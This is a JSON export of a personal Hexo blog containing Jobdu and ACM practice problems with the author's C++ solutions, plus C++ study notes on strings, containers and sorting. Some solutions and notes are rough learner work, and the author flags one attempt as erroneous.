Sorting题目描述：You are given an unsorted array of integer numbers. Your task is to sort this array and kill possible duplicated elements occurring in it. 输入：For each case, the first line of the input contains an integer number N representing the quantity of numbers in this array(1≤N≤1000). Next N lines contain N integer numbers(one number per each line) of the original array. 输出：For each case ,outtput file should contain at most N numbers sorted in ascending order. Every number in the output file should occur only once. 样例输入：68 8 7 3 7 7 样例输出：3 7 8 代码：123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;iterator&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;using namespace std;int main()&#123; int n; while(cin&gt;&gt;n)&#123; vector&lt;int&gt; a(n); for(int i=0;i&lt;n;i++) cin&gt;&gt;a[i]; sort(a.begin(),a.end()); unique(a.begin(),a.end()); for(int i=0;i&lt;n;i++) if(i&lt;n-1)&#123; if(a[i]&gt;=a[i+1])&#123; cout&lt;&lt;a[i]&lt;&lt;endl;; break; &#125;else cout&lt;&lt;a[i]&lt;&lt;\" \"; &#125; else cout&lt;&lt;a[i]&lt;&lt;endl; &#125;&#125; 1042:Coincidence题目描述：Find a longest common subsequence of two strings. 输入：First and second line of each input case contain two strings of lowercase character a…z. There are no spaces before, inside or after the strings. Lengths of strings do not exceed 100. 输出：For each case, output k – the length of a longest common subsequence in one line. 样例输入：abcdcxbydz 样例输出：2 代码：123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;int main()&#123; string str1,str2,str3; int len1,len2,num,ans; int k[101][101]=&#123;0&#125;; while(cin&gt;&gt;str1&gt;&gt;str2)&#123; for(int i=0;i&lt;101;i++)&#123; for(int j=0;j&lt;101;j++)&#123; k[i][j]=0; &#125; &#125; len1 = str1.length(); len2 = str2.length(); for(int i=0;i&lt;len1;i++)&#123; for(int j=0;j&lt;len2;j++)&#123; if(str1[i]==str2[j]) k[i][j]=1; &#125; &#125; ans=0; for(int i=len1-1;i&gt;=0;i--)&#123; for(int j=len2-1;j&gt;=0;j--)&#123; if(k[i][j]==0) continue; num=0; for(int n=i+1;n&lt;len1;n++) for(int m=j+1;m&lt;len2;m++) if(num&lt;k[n][m]) num=k[n][m]; k[i][j]=num+1; if(ans&lt;k[i][j]) ans=k[i][j]; &#125; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125;&#125; 1043:Day of Week题目描述：We now use the Gregorian style of dating in Russia. The leap years are years with number divisible by 4 but not divisible by 100, or divisible by 400.For example, years 2004, 2180 and 2400 are leap. Years 2004, 2181 and 2300 are not leap.Your task is to write a program which will compute the day of week corresponding to a given date in the nearest past or in the future using today’s agreement about dating. 输入：There is one single line contains the day number d, month name M and year number y(1000≤y≤3000). The month name is the corresponding English name starting from the capital letter. 输出：Output a single line with the English name of the day of week corresponding to the date, starting from the capital letter. All other letters must be in lower case. 样例输入：9 October 200114 October 2001 样例输出：TuesdaySunday 提示：Month and Week name in Input/Output:January, February, March, April, May, June, July, August, September, October, November, DecemberSunday, Monday, Tuesday, Wednesday, Thursday, Friday, Saturday 代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;using namespace std;string coutweek(int w)&#123; string str[7]=&#123;\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"&#125;; return str[w-1];&#125;int cinmouth(string s)&#123; string str[12]=&#123;\"January\", \"February\", \"March\", \"April\", \"May\", \"June\", \"July\", \"August\", \"September\", \"October\", \"November\", \"December\"&#125;; int i; for(i=1;i&lt;=12;i++)&#123; if(s.compare(str[i-1])==0) break; &#125; return i;&#125;int main()&#123; int y=2017,m=4,d=27,w=4; int y1,m1,d1,w1; int mouth[12]=&#123;31,28,31,30,31,30,31,31,30,31,30,31&#125;; int day,i; string str; w=w-(31+28+31+d-1)%7; while(w&lt;=0)&#123; w+=7; &#125; m=1; d=1; while(cin&gt;&gt;d1&gt;&gt;str&gt;&gt;y1)&#123; m1=cinmouth(str); day=0; if(y1&lt;y)&#123; for(i=y1;i&lt;y;i++)&#123; if(i%400==0||(i%4==0&amp;&amp;i%100!=0)) day+=366; else day+=365; &#125; if(y1%400==0||(y1%4==0&amp;&amp;y1%100!=0)) mouth[1]=29; else mouth[1]=28; for(i=1;i&lt;m1;i++) day-=mouth[i-1]; day-=d1-1; w1=w-day%7; while(w1&lt;=0)&#123; w1+=7; &#125; &#125; else&#123; for(i=y;i&lt;y1;i++)&#123; if(i%400==0||(i%4==0&amp;&amp;i%100!=0)) day+=366; else day+=365; &#125; if(y1%400==0||(y1%4==0&amp;&amp;y1%100!=0)) mouth[1]=29; for(i=1;i&lt;m1;i++) day+=mouth[i-1]; day+=d1-1; w1=w+day%7; while(w1&gt;7)&#123; w1-=7; &#125; &#125; cout&lt;&lt;coutweek(w1)&lt;&lt;endl; &#125; return 0;&#125; 1044:Pre-Post题目描述：We are all familiar with pre-order, in-order and post-order traversals of binary trees. A common problem in data structure classes is to find the pre-order traversal of a binary tree when given the in-order and post-order traversals. Alternatively, you can find the post-order traversal when given the in-order and pre-order. However, in general you cannot determine the in-order traversal of a tree when given its pre-order and post-order traversals. Consider the four binary trees below: All of these trees have the same pre-order and post-order traversals. This phenomenon is not restricted to binary trees, but holds for general m-ary trees as well. 输入：Input will consist of multiple problem instances. Each instance will consist of a line of the formm s1 s2 indicating that the trees are m-ary trees, s1 is the pre-order traversal and s2 is the post-order traversal.All traversal strings will consist of lowercase alphabetic characters. For all input instances, 1 &lt;= m &lt;= 20 and the length of s1 and s2 will be between 1 and 26 inclusive. If the length of s1 is k (which is the same as the length of s2, of course), the first k letters of the alphabet will be used in the strings. An input line of 0 will terminate the input. 输出：For each problem instance, you should output one line containing the number of possible trees which would result in the pre-order and post-order traversals for the instance. All output values will be within the range of a 32-bit signed integer. For each problem instance, you are guaranteed that there is at least one tree with the given pre-order and post-order traversals. 样例输入：2 abc cba2 abc bca10 abc bca13 abejkcfghid jkebfghicda 样例输出：4145207352860 代码：123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;using namespace std;int combination(int a,int b)&#123; int i,ans; ans = a; for(i=2;i&lt;=b;i++)&#123; ans = ans*(a-i+1)/i; &#125; return ans;&#125;int num_tra(int k,string str1,string str2)&#123; int poi,i=0; int ans=1; string str11,str22; if(str1.empty()) return 1; while(1)&#123; if(str1.empty()) break; poi=str2.find(str1[0]); str11=str1.substr(0,poi+1); str11.erase(0,1); str22=str2.substr(0,poi); ans=ans*num_tra(k,str11,str22); str1.erase(0,poi+1); str2.erase(0,poi+1); i++; &#125; return ans*combination(k,i);&#125;int main()&#123; int k; string str1,str2; while(cin&gt;&gt;k&gt;&gt;str1&gt;&gt;str2)&#123; str1.erase(0,1); str2.erase(str2.end()-1); cout&lt;&lt;num_tra(k,str1,str2)&lt;&lt;endl; &#125;&#125;","categories":[{"name":"研究生机试备战之旅","slug":"研究生机试备战之旅","permalink":"http://yoursite.com/categories/研究生机试备战之旅/"},{"name":"九度1036-1044","slug":"研究生机试备战之旅/九度1036-1044","permalink":"http://yoursite.com/categories/研究生机试备战之旅/九度1036-1044/"}],"tags":[{"name":"大数运算","slug":"大数运算","permalink":"http://yoursite.com/tags/大数运算/"}]},{"title":"C++ 知识点总结","slug":"c++_prime","date":"2017-04-13T12:34:41.000Z","updated":"2017-10-08T12:26:00.067Z","comments":true,"path":"2017/04/13/c++_prime/","link":"","permalink":"http://yoursite.com/2017/04/13/c++_prime/","excerpt":"读取数量不定的操作符文件结束符，输入Ctrl+V，然后输入ENter123while (std::cin &gt;&gt; value) &#123; /* code */&#125;","text":"读取数量不定的操作符文件结束符，输入Ctrl+V，然后输入ENter123while (std::cin &gt;&gt; value) &#123; /* code */&#125; 字符串string常用操作1234567#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;int main()&#123; string s=\"123456789\"; s.substr(1,5); //从1开始取，连续取出5位的字符&#125; 字符/字符串 与 数字 的转换（待补充）字符与数字的转换123456789#include &lt;iostream&gt;using namespace std;int main()&#123; int n = 5; char c = '8'; cout&lt;&lt;char(n+'0')&lt;&lt;endl; cout&lt;&lt;int(c-'0')&lt;&lt;endl;&#125; 字符串与数字的转换数字转字符串：使用sprintf()函数1234567891011121314char str[10];int a=1234321;sprintf(str,\"%d\",a);char str[10];double a=123.321;sprintf(str,\"%.3lf\",a);char str[10];int a=175;sprintf(str,\"%x\",a);//10进制转换成16进制，如果输出大写的字母是sprintf(str,\"%X\",a)char *itoa(int value, char* string, int radix);//同样也可以将数字转字符串，不过itoa()这个函数是平台相关的（不是标准里的），故在这里不推荐使用这个函数。 字符串转数字：使用sscanf()函数1234567891011char str[]=\"1234321\";int a;sscanf(str,\"%d\",&amp;a);char str[]=\"123.321\";double a;sscanf(str,\"%lf\",&amp;a);char str[]=\"AF\";int a;sscanf(str,\"%x\",&amp;a); //16进制转换成10进制 另外也可以使用atoi(),atol(),atof(). 使用stringstream类用ostringstream对象写一个字符串，类似于sprintf() 123456#include &lt;sstream&gt;ostringstream s1;int i = 22;s1 &lt;&lt; \"Hello \" &lt;&lt; i &lt;&lt; endl;string s2 = s1.str();cout &lt;&lt; s2; 用istringstream对象读一个字符串，类似于sscanf() 1234567#include &lt;sstream&gt;istringstream stream1;string string1 = \"25\";stream1.str(string1);int i;stream1 &gt;&gt; i;cout &lt;&lt; i &lt;&lt; endl; // displays 25 队列与栈使用标准库的栈和队列时，先包含相关的头文件 12#include&lt;stack&gt;#include&lt;queue&gt; 定义栈如下： 1stack&lt;int&gt; stk; 定义队列如下： 1queue&lt;int&gt; q; 栈提供了如下的操作 12345s.empty() // 如果栈为空返回true，否则返回false s.size() // 返回栈中元素的个数 s.pop() // 删除栈顶元素但不返回其值 s.top() // 返回栈顶的元素，但不删除该元素 s.push() // 在栈顶压入新元素 队提供了如下的操作 123456q.empty() // 如果队列为空返回true，否则返回false q.size() // 返回队列中元素的个数 q.pop() // 删除队列首元素但不返回其值 q.front() // 返回队首元素的值，但不删除该元素 q.push() // 在队尾压入新元素 q.back() // 返回队列尾元素的值，但不删除该元素 优先队列123priority_queue&lt;int&gt; Q; //大顶堆，堆顶取得的元素为整个堆的最大元素priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt; Q; //小顶顶堆，堆顶取得的元素为整个堆的最小元素 排序及删除相同元素vector与数组排序 函数名 功能描述 sort 对给定区间所有元素进行排序 stable_sort 对给定区间所有元素进行稳定排序 partial_sort 对给定区间所有元素部分排序 partial_sort_copy 对给定区间复制并排序 nth_element 找出给定区间的某个位置对应的元素 is_sorted 判断一个区间是否已经排好序 partition 使得符合某个条件的元素放在前面 stable_partition 相对稳定的使得符合某个条件的元素放在前面 用法如下 12345#include &lt;algorithm&gt;int a[]=&#123;8,8,7,3,7,7&#125;;sort(a,a+6);partial_sort(a,a+6); 输出为：3 7 7 7 8 8 删除相同元素12#include &lt;algorithm&gt;、、、、、、、、、、、、、、、、、、、、、、、、 输出为：3 7 7 7 8 8 抽象容器——vector list dequevector： list： deque： cout输出double控制精度123#include&lt;iomanip&gt;double ans=1.1;cout&lt;&lt;fixed&lt;&lt;setprecision(3)&lt;&lt;ans&lt;&lt;endl; 结构体struct12345678910#include&lt;algorithm&gt;struct JavaBean&#123; int j; int f; double s; //j/f bool operator &lt; (const JavaBean &amp;A) const&#123; return s&gt;A.s; &#125;&#125;; 若使用sort，运算符重载必须重载“&lt;” 队列","categories":[{"name":"研究生机试备战之旅","slug":"研究生机试备战之旅","permalink":"http://yoursite.com/categories/研究生机试备战之旅/"}],"tags":[{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"}]},{"title":"Jobdu 1000-1010（未完待续）","slug":"jobdu1000-1014","date":"2017-04-11T14:23:17.000Z","updated":"2017-10-08T12:26:08.932Z","comments":true,"path":"2017/04/11/jobdu1000-1014/","link":"","permalink":"http://yoursite.com/2017/04/11/jobdu1000-1014/","excerpt":"注：以下题目来源于九度 题目1000题目描述：求整数a，b的和。 输入：测试案例有多行，每行为a，b的值。 输出：输出多行，对应a+b的结果。","text":"注：以下题目来源于九度 题目1000题目描述：求整数a，b的和。 输入：测试案例有多行，每行为a，b的值。 输出：输出多行，对应a+b的结果。 样例输入：1 24 56 9 样例输出：3915 代码：这道题就是用到了文件的结束标识符：EOF，在windows下是ctrl+z，在命令行窗口运行遇到文件结束符才结束的程序时，到该结束时，先按一下回车，再按ctrl+z，再按回车就好了。 12345678#include&lt;cstdio&gt;int main()&#123; int a,b; while(scanf(\"%d%d\",&amp;a,&amp;b)!=EOF)&#123; printf(\"%d\\n\",a+b); &#125; return 0;&#125; 题目1001题目描述：This time, you are supposed to find A+B where A and B are two matrices, and then count the number of zero rows and columns. 输入：The input consists of several test cases, each starts with a pair of positive integers M and N (≤10) which are the number of rows and columns of the matrices, respectively. Then 2*M lines follow, each contains N integers in [-100, 100], separated by a space. The first M lines correspond to the elements of A and the second M lines to that of B. The input is terminated by a zero M and that case must NOT be processed. 输出：For each test case you should output in one line the total number of zero rows and columns of A+B. 样例输入：2 21 11 1-1 -110 92 31 2 34 5 6-1 -2 -3-4 -5 -60 样例输出：15 代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include&lt;cstdio&gt;int main()&#123; int m,n; int i,j,k; while(1)&#123; scanf(\"%d\",&amp;m); if(m==0) break; scanf(\"%d\",&amp;n); int a[m][n][2],b[m][n]; int num=0,r; // 读取数据 for(i=0;i&lt;2;i++)&#123; for(j=0;j&lt;m;j++)&#123; for(k=0;k&lt;n;k++)&#123; scanf(\"%d\",&amp;a[j][k][i]); &#125; &#125; &#125; // 相加 for(j=0;j&lt;m;j++)&#123; for(k=0;k&lt;n;k++)&#123; b[j][k]=a[j][k][0]+a[j][k][1]; &#125; &#125; // 判断为0的行 for(j=0;j&lt;m;j++)&#123; r=0; for(k=0;k&lt;n;k++)&#123; if(b[j][k]!=0) r=1; &#125; if(r==0)&#123; num++; &#125; &#125; // 判断为0的列 for(k=0;k&lt;n;k++)&#123; r=0; for(j=0;j&lt;m;j++)&#123; if(b[j][k]!=0) r=1; &#125; if(r==0)&#123; num++; &#125; &#125; printf(\"%d\\n\",num); &#125; return 0;&#125; 题目1002题目描述：Grading hundreds of thousands of Graduate Entrance Exams is a hard work. It is even harder to design a process to make the results as fair as possible. One way is to assign each exam problem to 3 independent experts. If they do not agree to each other, a judge is invited to make the final decision. Now you are asked to write a program to help this process. For each problem, there is a full-mark P and a tolerance T(\\&lt;P) given. The grading rules are: A problem will first be assigned to 2 experts, to obtain G1 and G2. If the difference is within the tolerance, that is, if |G1 - G2| ≤ T, this problem’s grade will be the average of G1 and G2. If the difference exceeds T, the 3rd expert will give G3. If G3 is within the tolerance with either G1 or G2, but NOT both, then this problem’s grade will be the average of G3 and the closest grade. If G3 is within the tolerance with both G1 and G2, then this problem’s grade will be the maximum of the three grades. If G3 is within the tolerance with neither G1 nor G2, a judge will give the final grade GJ. 输入：Each input file may contain more than one test case.Each case occupies a line containing six positive integers: P, T, G1, G2, G3, and GJ, as described in the problem. It is guaranteed that all the grades are valid, that is, in the interval [0, P]. 输出：For each test case you should output the final grade of the problem in a line. The answer must be accurate to 1 decimal place. 样例输入：20 2 15 13 10 18 样例输出：14.0 代码：1234567891011121314151617181920212223242526272829303132#include&lt;cstdio&gt;#include&lt;math.h&gt;#include&lt;stdlib.h&gt;int max(int a,int b)&#123; if(a&gt;b) return a; else return b;&#125;int main()&#123; int p,t,g1,g2,g3,gj; float result; // while(scanf(\"%d %d %d %d %d %d\",&amp;p,&amp;t,&amp;g1,&amp;g2,&amp;g3,&amp;gj)!=EOF)&#123; while(scanf(\"%d\",&amp;p)!=EOF)&#123; scanf(\"%d%d%d%d%d\",&amp;t,&amp;g1,&amp;g2,&amp;g3,&amp;gj); if(abs(g1-g2)&lt;=t)&#123; result=(g1+g2)/2.0; &#125;else if(abs(g1-g3)&gt;t &amp;&amp; abs(g2-g3)&gt;t)&#123; result=gj; &#125;else if(abs(g1-g3)&lt;=t &amp;&amp; abs(g2-g3)&lt;=t)&#123; result=max(g1,g2); &#125;else&#123; if(abs(g1-g3)&gt;abs(g2-g3)) result=(g2+g3)/2.0; else result=(g1+g3)/2.0; &#125; printf(\"%.1f\\n\",result*1.0); &#125; return 0;&#125; 题目1003题目描述：给定两个整数A和B，其表示形式是：从个位开始，每三位数用逗号”,”隔开。 现在请计算A+B的结果，并以正常形式输出。 输入：输入包含多组数据数据，每组数据占一行，由两个整数A和B组成（-10^9 &lt; A,B &lt; 10^9）。 输出：请计算A+B的结果，并以正常形式输出，每组数据占一行。 样例输入：-234,567,890 123,456,7891,234 2,345,678 样例输出：-1111111012346912 代码：注：直接读取数字，运行错误（原因未知）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;cstdio&gt;#include&lt;math.h&gt;#include&lt;stdlib.h&gt;int pow(int a,int b)&#123; if(a==0) return 0; if(b==0) return 1; else if(b==1) return a; else&#123; return a*pow(a,b-1); &#125;&#125;int main()&#123; long int len=10; long int a[len],b[len]; while(scanf(\"%d\",&amp;a[0])!=EOF)&#123; long int int_a=0,int_b=0; long int num_a=1,num_b=0,i; char c; for(i=1;i&lt;len;i++)&#123; c=getchar(); if(c==' '||c=='\\n') break; scanf(\"%d\",&amp;a[i]); //错误，当i从1开始时结果遗异常 num_a++; &#125; for(i=0;i&lt;num_a;i++) int_a+=abs(a[i])*pow(10,(num_a-i-1)*3); if(a[0]&lt;0) int_a=-int_a; for(i=0;i&lt;len;i++)&#123; scanf(\"%d\",&amp;b[i]); num_b++; c=getchar(); if(c==' '||c=='\\n') break; &#125; for(i=0;i&lt;num_b;i++) int_b+=abs(b[i])*pow(10,(num_b-i-1)*3); if(b[0]&lt;0) int_b=-int_b; printf(\"%d\\n\",int_a+int_b); &#125;&#125; 注：读取两个字符串再转为数字，正确1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;math.h&gt; using namespace std; int reverse(string a) &#123; int x=0; if(a[0]=='-') &#123; for(int i=1;i&lt;a.length();i++) if(a[i]&gt;='0'&amp;&amp;a[i]&lt;='9') x = x*10+a[i]-'0'; x = -x; &#125; else for(int i=0;i&lt;a.length();i++) if(a[i]&gt;='0'&amp;&amp;a[i]&lt;='9') x = x*10+a[i]-'0'; return x; &#125; int main() &#123; string a,b; while(cin&gt;&gt;a&gt;&gt;b) &#123; cout&lt;&lt;reverse(a)+reverse(b)&lt;&lt;endl; &#125; return 0; &#125;","categories":[{"name":"研究生机试备战之旅","slug":"研究生机试备战之旅","permalink":"http://yoursite.com/categories/研究生机试备战之旅/"},{"name":"九度1000-1014","slug":"研究生机试备战之旅/九度1000-1014","permalink":"http://yoursite.com/categories/研究生机试备战之旅/九度1000-1014/"}],"tags":[]},{"title":"Issue 772：Police And The Thief","slug":"issue772","date":"2017-04-09T12:45:22.000Z","updated":"2017-10-08T12:28:37.671Z","comments":true,"path":"2017/04/09/issue772/","link":"","permalink":"http://yoursite.com/2017/04/09/issue772/","excerpt":"首先我们定义Police和Thief之间的曼哈顿距离dis = |xp - xt| + |yp - yt| 作为一个聪明的小偷，他每次的行动会尽可能的使dis增大，而作为一个牛B的警察，他每次的行动会尽可能使dis减小 当然，由于小偷和警察的关系是小偷被警察追着跑 所以要使警察每次使dis-1并不难…","text":"首先我们定义Police和Thief之间的曼哈顿距离dis = |xp - xt| + |yp - yt| 作为一个聪明的小偷，他每次的行动会尽可能的使dis增大，而作为一个牛B的警察，他每次的行动会尽可能使dis减小 当然，由于小偷和警察的关系是小偷被警察追着跑 所以要使警察每次使dis-1并不难…现在考虑小偷的面临的局面，若他在这个地图的非边界位置，他每次都可以使dis + 1,而警察会使dis - 1 若小偷在地图的边界位置上，小偷会遇到 不得不使dis - 1 ,而警察又会使dis - 1.这样,dis - 2了……. 在可预见的未来，我们知道，小偷和警察最后的位置应该只会有两种情况： 小偷和警察相邻; 小偷和警察对角相邻;(即在一个2*2的矩阵中，比如一个人在左上角，一个人在右下角，即为对角相邻) 现在我们考虑谁先手的问题。 若小偷先手，二者相邻的话，小偷是不会被抓住的；二者若对角相邻，反之。 同理可得警察先手的情况。 整体思路为上所述，但是还是要考虑一些特殊情况： 二者一开始就在一起； 地图的形状很特殊：n1或1m的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* * Prob: Police and the thief * LANG: C++*/#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;cmath&gt;using namespace std;const char THIEF[6] = &quot;thief&quot;;int T , n , m;int xp , yp , xt , yt;char str[20];int main()&#123; scanf(&quot;%d&quot; , &amp;T); for (int i = 0;i &lt; T;i ++) &#123; scanf(&quot;%d%d&quot; , &amp;n , &amp;m); scanf(&quot;%d%d%d%d&quot; , &amp;xp , &amp;yp , &amp;xt , &amp;yt); scanf(&quot;%s&quot; , str); int delta = abs(xp - xt) + abs(yp - yt); if ((xp == xt) &amp;&amp; (yp == yt)) &#123; printf(&quot;YES\\n&quot;); continue; &#125; if (n == 1 || m == 1) &#123; //if (delta % 2 == 0) printf(&quot;YES\\n&quot;); /* else printf(&quot;NO\\n&quot;); */ continue; &#125; if (strcmp(str , THIEF) == 0) &#123; if (delta % 2 == 0) printf(&quot;YES\\n&quot;); else printf(&quot;NO\\n&quot;); &#125; else &#123; if (delta % 2 == 0) printf(&quot;NO\\n&quot;); else printf(&quot;YES\\n&quot;); &#125; &#125; //for i _ T return 0;&#125; //main","categories":[{"name":"ACM","slug":"ACM","permalink":"http://yoursite.com/categories/ACM/"}],"tags":[{"name":"博弈论","slug":"博弈论","permalink":"http://yoursite.com/tags/博弈论/"}]},{"title":"Hello World","slug":"hello-world","date":"2017-04-03T06:23:56.000Z","updated":"2017-10-08T12:26:20.016Z","comments":true,"path":"2017/04/03/hello-world/","link":"","permalink":"http://yoursite.com/2017/04/03/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"Testing","slug":"Testing","permalink":"http://yoursite.com/categories/Testing/"}],"tags":[{"name":"Testing","slug":"Testing","permalink":"http://yoursite.com/tags/Testing/"},{"name":"Another Tag","slug":"Another-Tag","permalink":"http://yoursite.com/tags/Another-Tag/"}]}]}